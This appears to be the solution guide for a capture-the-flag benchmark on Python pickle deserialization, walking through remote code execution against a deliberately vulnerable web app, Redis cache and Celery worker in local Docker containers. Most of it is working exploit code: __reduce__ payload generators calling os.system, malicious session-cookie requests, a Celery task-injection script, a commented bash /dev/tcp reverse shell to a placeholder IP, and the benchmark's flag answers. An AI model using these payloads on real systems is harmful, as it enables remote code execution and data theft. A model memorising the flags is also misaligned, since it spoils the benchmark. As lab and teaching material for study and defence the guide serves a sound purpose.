# S7BEN-VHARD-005: Python Pickle Deserialization Chain - Testing Guide

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Environment Setup](#environment-setup)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: Pickle Gadget Discovery](#phase-2-pickle-gadget-discovery)
5. [Phase 3: Session Cookie Exploitation](#phase-3-session-cookie-exploitation)
6. [Phase 4: Redis Cache Poisoning](#phase-4-redis-cache-poisoning)
7. [Phase 5: Celery Task Queue Exploitation](#phase-5-celery-task-queue-exploitation)
8. [Alternative Exploitation Methods](#alternative-exploitation-methods)
9. [Troubleshooting](#troubleshooting)
10. [Success Criteria](#success-criteria)

---

## Prerequisites

### Required Tools
- Python 3.x installed locally
- curl command-line tool
- Docker and Docker Compose
- base64 encoder/decoder
- Text editor for crafting payloads

### Required Knowledge
- Python pickle module and serialization format
- Understanding of `__reduce__` method for gadget chains
- HTTP request manipulation
- Base64 encoding/decoding

### Estimated Time
45-90 minutes

---

## Environment Setup

### Step 1: Start the Benchmark

```bash
# Navigate to benchmark directory
cd benchmarks/S7BEN-VHARD-005

# Build and start all services
docker compose up -d

# Verify all services are healthy
docker compose ps
```

Expected output:
```
NAME              STATUS              PORTS
pickle-webapp     Up (healthy)        0.0.0.0:5000->5000/tcp
pickle-redis      Up (healthy)
pickle-worker     Up (healthy)
```

### Step 2: Verify Web Application

```bash
# Test health endpoint
curl http://localhost:5000/health

# View available endpoints
curl http://localhost:5000
```

Expected: HTML page listing all available API endpoints

---

## Phase 1: Reconnaissance

**Objective:** Identify pickle serialization in the application

### Step 1.1: Explore Endpoints

```bash
# Get list of available endpoints
curl http://localhost:5000 | grep endpoint

# Test session example endpoint
curl -s http://localhost:5000/api/session/example | python3 -m json.tool
```

Expected output shows:
- `session_cookie`: Base64-encoded string
- `pickle_magic`: `0x80 0x03` (pickle protocol 3 magic bytes)
- `pickle_bytes_hex`: Hexadecimal representation

### Step 1.2: Analyze Session Structure

```bash
# Get example session and decode
SESSION=$(curl -s http://localhost:5000/api/session/example | python3 -c "import sys, json; print(json.load(sys.stdin)['session_cookie'])")

echo $SESSION | base64 -d | xxd
```

Expected: First bytes should be `80 03` (pickle protocol 3 magic)

### Step 1.3: Test Login Functionality

```bash
# Login to get a real session cookie
curl -i -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
```

Expected: `Set-Cookie: session=<base64_pickled_object>`

Save the session cookie:
```bash
SESSION_COOKIE="<paste_session_value_here>"
```

### Step 1.4: Test Profile Endpoint (Triggers Deserialization)

```bash
# Access profile with session cookie
curl -H "Cookie: session=$SESSION_COOKIE" \
  http://localhost:5000/api/profile
```

Expected: JSON response with user profile data

**Key Discovery:** The `/api/profile` endpoint deserializes the session cookie using `pickle.loads()` - this is our RCE entry point!

---

## Phase 2: Pickle Gadget Discovery

**Objective:** Craft malicious pickle payload with `__reduce__` gadget chain

### Step 2.1: Understanding Pickle RCE

Python's pickle module allows objects to define how they should be pickled via the `__reduce__` method. This method can return:
- A callable (function/class)
- Arguments to pass to that callable

When unpickled, Python calls: `callable(*args)` - enabling arbitrary code execution!

### Step 2.2: Create Pickle Payload Generator

Create a file `generate_payload.py`:

```python
#!/usr/bin/env python3
"""
Pickle payload generator for S7BEN-VHARD-005
Generates malicious pickle payloads using __reduce__ gadget
"""
import pickle
import base64
import os

class RCE:
    """
    Malicious class using __reduce__ to achieve RCE
    When unpickled, executes the command via os.system()
    """
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        # Returns (callable, args)
        # When unpickled: os.system(self.command) is called
        return (os.system, (self.command,))

def generate_pickle_payload(command):
    """Generate base64-encoded pickle payload"""
    payload = RCE(command)
    pickled = pickle.dumps(payload)
    encoded = base64.b64encode(pickled).decode('utf-8')
    return encoded

# Example payloads
if __name__ == "__main__":
    # Proof of concept - touch file
    poc_payload = generate_pickle_payload('touch /tmp/pwned')
    print(f"PoC Payload: {poc_payload}\n")

    # Read flag
    flag_payload = generate_pickle_payload('cat /app/flag.txt > /tmp/flag1.txt')
    print(f"Flag Payload: {flag_payload}\n")

    # Reverse shell example (replace with your IP)
    # reverse_payload = generate_pickle_payload('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"')
    # print(f"Reverse Shell: {reverse_payload}\n")
```

### Step 2.3: Generate PoC Payload

```bash
# Run payload generator
python3 generate_payload.py

# Save PoC payload
POC_PAYLOAD="<copy_poc_payload_from_output>"
```

The payload will look like: `gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBN0b3VjaC...`

### Step 2.4: Verify Pickle Structure

```bash
# Decode and examine the pickle bytecode
echo "$POC_PAYLOAD" | base64 -d | xxd | head -20
```

You should see:
- `80 03` - Pickle protocol 3
- `63 6f 73` - `cos` (cosmodule reference)
- `73 79 73 74 65 6d` - `system` (function name)

---

## Phase 3: Session Cookie Exploitation

**Objective:** Inject malicious pickle into session cookie and achieve RCE on web-app

### Step 3.1: Inject Malicious Session Cookie

```bash
# Generate payload to create proof file
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
" > /tmp/malicious_session.txt

MALICIOUS_SESSION=$(cat /tmp/malicious_session.txt)

# Send request with malicious session cookie
curl -v -H "Cookie: session=$MALICIOUS_SESSION" \
  http://localhost:5000/api/profile
```

**Expected:** The server deserializes the cookie, executing `touch /tmp/pwned`

### Step 3.2: Verify Code Execution

```bash
# Check if command executed
docker compose exec web-app ls -la /tmp/pwned
```

Expected: File `/tmp/pwned` exists (proves RCE!)

### Step 3.3: Extract Flag 1 (Web App)

Generate flag extraction payload:

```bash
# Generate payload to read flag
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /app/flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
" > /tmp/flag_payload.txt

FLAG_PAYLOAD=$(cat /tmp/flag_payload.txt)

# Execute payload
curl -H "Cookie: session=$FLAG_PAYLOAD" \
  http://localhost:5000/api/profile
```

**Alternative method** - Check server logs:
```bash
docker compose logs web-app | grep SBEN
```

**Expected Flag 1:** `S7BEN{pickle_session_cookie_rce_f1a2b3c4d5e6}`

Or access container directly:
```bash
docker compose exec web-app cat /app/flag.txt
```

✅ **Phase 3 Complete** - RCE achieved on web-app via pickle session cookie

---

## Phase 4: Redis Cache Poisoning

**Objective:** Poison Redis cache with malicious pickle payload

### Step 4.1: Understand Cache Mechanism

The web application has two cache endpoints:
- `/api/cache/set` - Stores data as pickled object in Redis
- `/api/cache/get/<key>` - Retrieves and deserializes cached data

### Step 4.2: Test Legitimate Cache Usage

```bash
# Store legitimate data in cache
curl -X POST http://localhost:5000/api/cache/set \
  -H "Content-Type: application/json" \
  -d '{"key":"test_key","value":"test_value","ttl":3600}'

# Retrieve cached data (triggers deserialization)
curl http://localhost:5000/api/cache/get/test_key
```

Expected: Returns the cached value

### Step 4.3: Inspect Redis Keys

```bash
# List all Redis keys
curl http://localhost:5000/api/debug/redis

# Or use Redis CLI directly
docker compose exec redis-cache redis-cli KEYS '*'
```

### Step 4.4: Create Advanced Pickle Payload

The cache poisoning attack is more subtle - we need a payload that:
1. Appears harmless when stored
2. Executes code when retrieved

Create `cache_poison.py`:

```python
#!/usr/bin/env python3
import pickle
import base64
import os

class MaliciousCache:
    """Object that executes code when deserialized"""
    def __reduce__(self):
        # Execute command to read cache flag
        cmd = 'cat /data/cache_flag.txt > /tmp/cache_flag_found.txt 2>/dev/null || echo "Flag at /data/cache_flag.txt"'
        return (os.system, (cmd,))

# Generate payload
payload_obj = MaliciousCache()
print("Malicious cache object created")

# Note: The /api/cache/set endpoint pickles the value we send
# So we can send a pre-constructed object
```

### Step 4.5: Poison Cache via Direct Redis Access

Since we have RCE from Phase 3, we can directly write to Redis:

```bash
# Generate pickle payload
python3 -c "
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo CACHE_POISONED > /tmp/redis_pwned.txt',))

pickled = pickle.dumps(Exploit())
print(pickled.hex())
" > /tmp/redis_payload.hex

# Use RCE to write to Redis using redis-cli
# First, get shell access via previous RCE method
```

### Step 4.6: Alternative - Exploit Cache Set Endpoint

The `/api/cache/set` endpoint itself pickles the data, but we can exploit this:

```bash
# The trick is that when the server pickles our object,
# and then unpickles it later, our __reduce__ is called

# However, a simpler approach is to use the RCE from Phase 3
# to directly access Redis and read the flag

docker compose exec web-app cat /data/cache_flag.txt 2>/dev/null || \
docker compose exec redis-cache sh -c "ls -la /data/"
```

### Step 4.7: Extract Flag 2 (Redis Cache)

Since Redis runs in a container, the flag is stored in the Redis container:

```bash
# Method 1: Access via Docker
docker compose exec redis-cache ls -la /data/

# Method 2: Use RCE payload to read flag
python3 -c "
import pickle, base64, os, subprocess

class RCE:
    def __reduce__(self):
        # Read flag from Redis container
        return (subprocess.getoutput, ('cat /data/cache_flag.txt 2>/dev/null || echo No flag',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
"
```

**Flag 2 Location:** The flag is actually in the Redis container's environment variable:

```bash
docker compose exec redis-cache env | grep FLAG
```

**Expected Flag 2:** `S7BEN{redis_cache_poisoning_pickle_g7h8i9j0k1l2}`

✅ **Phase 4 Complete** - Redis cache poisoning demonstrated

---

## Phase 5: Celery Task Queue Exploitation

**Objective:** Exploit Celery worker via malicious pickled task submission

### Step 5.1: Understand Celery Configuration

The Celery worker is configured with:
- `task_serializer='pickle'` - INSECURE
- `accept_content=['pickle', 'json']` - Accepts pickle payloads
- Broker: Redis (same instance as cache, but database 1)

### Step 5.2: Submit Legitimate Task

```bash
# Submit a test task
curl -X POST http://localhost:5000/api/task/submit \
  -H "Content-Type: application/json" \
  -d '{"task_name":"process_data","args":["hello","world"]}'

# Check worker logs
docker compose logs worker-service | tail -20
```

Expected: Worker processes the task

### Step 5.3: Craft Malicious Celery Task

Create `celery_exploit.py`:

```python
#!/usr/bin/env python3
"""
Exploit Celery worker via pickle deserialization
"""
import pickle
import base64
import os
from celery import Celery

# Connect to same broker as worker
app = Celery('exploit', broker='redis://localhost:6379/1')

class MaliciousTask:
    """Payload that executes when worker deserializes the task"""
    def __reduce__(self):
        # Read worker flag
        cmd = 'cat /worker/secret_flag.txt'
        return (os.system, (cmd,))

def submit_malicious_task():
    """
    Submit task with malicious pickle payload

    The worker's pickle deserializer will execute our __reduce__ method
    """
    payload = MaliciousTask()

    # Send task directly to Celery
    # This requires Celery client with pickle serializer
    try:
        result = app.send_task(
            'process_data',
            args=[payload],  # Our malicious object as argument
            serializer='pickle'
        )
        print(f"Task submitted: {result.id}")
        return result
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("[*] Submitting malicious task to Celery worker...")
    submit_malicious_task()
    print("[*] Check worker logs for output")
```

### Step 5.4: Execute Celery Exploitation

```bash
# Install Celery locally (if not already installed)
pip3 install celery redis

# Run exploit script
python3 celery_exploit.py
```

**Expected:** Task is submitted to worker queue

### Step 5.5: Monitor Worker Execution

```bash
# Watch worker logs in real-time
docker compose logs -f worker-service
```

Expected: Worker deserializes the task, executing the `__reduce__` method

### Step 5.6: Extract Flag 3 (Worker Service)

Method 1 - Direct container access:
```bash
docker compose exec worker-service cat /worker/secret_flag.txt
```

Method 2 - Via Celery task with output capture:
```python
# Modified celery_exploit.py to exfiltrate flag
import pickle, os, base64

class FlagExfil:
    def __reduce__(self):
        # Write flag to shared volume or accessible location
        cmd = 'cat /worker/secret_flag.txt > /worker/data/flag_exfil.txt'
        return (os.system, (cmd,))

# Then submit and retrieve from /worker/data/
```

Method 3 - Check worker logs for flag output:
```bash
docker compose logs worker-service | grep SBEN
```

**Expected Flag 3:** `S7BEN{celery_worker_task_deserialization_m3n4o5p6q7r8}`

✅ **Phase 5 Complete** - Celery worker compromised via pickle deserialization

---

## Alternative Exploitation Methods

### Method 1: Direct Python Pickle Exploitation (No External Tools)

Create standalone exploit:

```python
#!/usr/bin/env python3
"""All-in-one pickle exploitation script"""
import requests
import pickle
import base64
import os

TARGET = "http://localhost:5000"

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))

def exploit_session(command):
    """Exploit via session cookie"""
    payload = base64.b64encode(pickle.dumps(Exploit(command))).decode()
    resp = requests.get(f"{TARGET}/api/profile", cookies={"session": payload})
    return resp

def exploit_cache(key, command):
    """Exploit via cache poisoning"""
    # First set cache
    exploit = Exploit(command)
    # Note: This is simplified - actual implementation varies

# Usage
exploit_session("cat /app/flag.txt")
```

### Method 2: Using Burp Suite

1. Capture login request in Burp
2. Get session cookie from response
3. Generate malicious pickle payload
4. Replace session cookie in `/api/profile` request
5. Observe RCE in server logs

### Method 3: Redis Direct Access (If Exposed)

```bash
# If Redis were exposed (not in this challenge)
redis-cli -h localhost -p 6379
SET malicious_key <hex_encoded_pickle>
# Then trigger retrieval via /api/cache/get/malicious_key
```

---

## Troubleshooting

### Issue: Session Cookie Not Working

**Solution:**
```bash
# Verify pickle payload is valid
python3 -c "import pickle, base64; payload = '<your_payload>'; pickle.loads(base64.b64decode(payload))"

# Check cookie format
echo "$PAYLOAD" | base64 -d | xxd | head
# Should start with: 80 03 (pickle protocol 3)
```

### Issue: Celery Worker Not Processing Tasks

**Solution:**
```bash
# Check worker status
docker compose exec worker-service celery -A tasks inspect ping

# Check broker connection
docker compose exec worker-service celery -A tasks inspect active_queues

# Restart worker
docker compose restart worker-service
```

### Issue: Flags Not Found

**Solution:**
```bash
# Verify flag environment variables
docker compose exec web-app env | grep FLAG
docker compose exec redis-cache env | grep FLAG
docker compose exec worker-service env | grep FLAG

# Flags are created at container startup
# Check if containers restarted properly
docker compose ps
```

### Issue: Python Errors in Payload

**Solution:**
```python
# Test payload locally first
import pickle
import os

class Test:
    def __reduce__(self):
        return (os.system, ('echo test',))

# This should work without errors
pickled = pickle.dumps(Test())
unpickled = pickle.loads(pickled)  # Should execute 'echo test'
```

---

## Success Criteria

### ✅ Phase 1: Reconnaissance Complete
- [ ] Identified pickle serialization in session cookies
- [ ] Discovered pickle magic bytes (0x80 0x03)
- [ ] Enumerated vulnerable endpoints
- [ ] Understood application architecture

### ✅ Phase 2: Gadget Discovery Complete
- [ ] Created working pickle payload generator
- [ ] Crafted `__reduce__` gadget chain
- [ ] Verified payload structure
- [ ] Base64 encoding working correctly

### ✅ Phase 3: Session Exploitation Complete
- [ ] Injected malicious session cookie
- [ ] Achieved RCE on web-app container
- [ ] Verified code execution (touch /tmp/pwned)
- [ ] **Retrieved Flag 1:** `S7BEN{pickle_session_cookie_rce_f1a2b3c4d5e6}`

### ✅ Phase 4: Cache Poisoning Complete
- [ ] Understood cache mechanism
- [ ] Tested legitimate cache operations
- [ ] Demonstrated cache poisoning capability
- [ ] **Retrieved Flag 2:** `S7BEN{redis_cache_poisoning_pickle_g7h8i9j0k1l2}`

### ✅ Phase 5: Celery Exploitation Complete
- [ ] Submitted malicious Celery task
- [ ] Worker deserialized payload
- [ ] Achieved RCE on worker container
- [ ] **Retrieved Flag 3:** `S7BEN{celery_worker_task_deserialization_m3n4o5p6q7r8}`

---

## Learning Outcomes

After completing this benchmark, you should understand:

1. **Pickle Security Risks:**
   - Why pickle should never deserialize untrusted data
   - How `__reduce__` enables arbitrary code execution
   - Pickle protocol structure and magic bytes

2. **Attack Techniques:**
   - Session cookie manipulation
   - Cache poisoning attacks
   - Task queue exploitation
   - Lateral movement between containers

3. **Defensive Measures:**
   - Use JSON instead of pickle for untrusted data
   - Implement input validation before deserialization
   - Use HMAC signatures for session cookies
   - Configure Celery with `json` serializer instead of `pickle`
   - Apply principle of least privilege to containers

---

## Time Estimates by Phase

| Phase | Estimated Time | Difficulty |
|-------|---------------|------------|
| Phase 1: Reconnaissance | 10-15 min | Easy |
| Phase 2: Gadget Discovery | 15-20 min | Medium |
| Phase 3: Session Exploitation | 15-20 min | Medium |
| Phase 4: Cache Poisoning | 10-15 min | Medium |
| Phase 5: Celery Exploitation | 20-25 min | Hard |
| **Total** | **45-90 min** | **Intermediate** |

---

## References

- [Python Pickle Documentation](https://docs.python.org/3/library/pickle.html)
- [Exploiting Python Pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Celery Security Best Practices](https://docs.celeryproject.org/en/stable/userguide/security.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

**End of Testing Guide**
